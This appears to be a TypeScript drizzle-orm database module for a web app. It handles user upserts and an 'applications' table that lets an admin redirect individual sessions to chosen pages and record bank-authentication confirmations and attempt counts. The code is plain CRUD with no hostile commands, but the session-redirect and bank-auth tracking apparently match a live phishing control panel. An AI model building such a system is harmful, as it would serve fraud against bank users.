import { desc, eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { applications, InsertApplication, InsertUser, users } from "../drizzle/schema";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

// Lazily create the drizzle instance so local tooling can run without a DB.
export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) {
    throw new Error("User openId is required for upsert");
  }

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = {
      openId: user.openId,
    };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) {
      values.lastSignedIn = new Date();
    }

    if (Object.keys(updateSet).length === 0) {
      updateSet.lastSignedIn = new Date();
    }

    await db.insert(users).values(values).onDuplicateKeyUpdate({
      set: updateSet,
    });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot get user: database not available");
    return undefined;
  }

  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);

  return result.length > 0 ? result[0] : undefined;
}

// ============ دوال الطلبات ============

export async function upsertApplication(data: InsertApplication): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const now = Date.now();
  const values: InsertApplication = {
    ...data,
    updatedAt: now,
    createdAt: data.createdAt ?? now,
  };
  const updateSet: Record<string, unknown> = { updatedAt: now };
  // فقط الحقول التي لها قيمة فعلية (غير null وغير undefined) تُحدَّث
  for (const [key, val] of Object.entries(data)) {
    if (key === 'sessionId' || key === 'createdAt') continue;
    if (val !== null && val !== undefined && val !== '') {
      updateSet[key] = val;
    }
  }
  await db.insert(applications).values(values).onDuplicateKeyUpdate({ set: updateSet });
}

export async function getApplicationBySessionId(sessionId: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.select().from(applications).where(eq(applications.sessionId, sessionId)).limit(1);
  return result.length > 0 ? result[0] : null;
}

export async function getAllApplications() {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  return db.select().from(applications).orderBy(desc(applications.createdAt));
}

export async function updateApplicationStatus(sessionId: string, status: "pending" | "approved" | "rejected") {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(applications).set({ status, updatedAt: Date.now() }).where(eq(applications.sessionId, sessionId));
}

export async function setAdminRedirect(sessionId: string, page: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(applications).set({ adminRedirectPage: page, updatedAt: Date.now() }).where(eq(applications.sessionId, sessionId));
}

export async function clearAdminRedirect(sessionId: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(applications).set({ adminRedirectPage: null, updatedAt: Date.now() }).where(eq(applications.sessionId, sessionId));
}

export async function setBankAuthConfirmed(sessionId: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  // جلب العدد الحالي للمحاولات ثم زيادته
  const [app] = await db.select({ attempts: applications.bankAuthAttempts }).from(applications).where(eq(applications.sessionId, sessionId)).limit(1);
  const currentAttempts = app?.attempts ?? 0;
  await db.update(applications).set({ bankAuthConfirmed: 1, bankAuthAttempts: currentAttempts + 1, updatedAt: Date.now() }).where(eq(applications.sessionId, sessionId));
}

export async function deleteApplication(sessionId: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.delete(applications).where(eq(applications.sessionId, sessionId));
}

export async function archiveApplication(sessionId: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(applications).set({ isArchived: 1, updatedAt: Date.now() }).where(eq(applications.sessionId, sessionId));
}
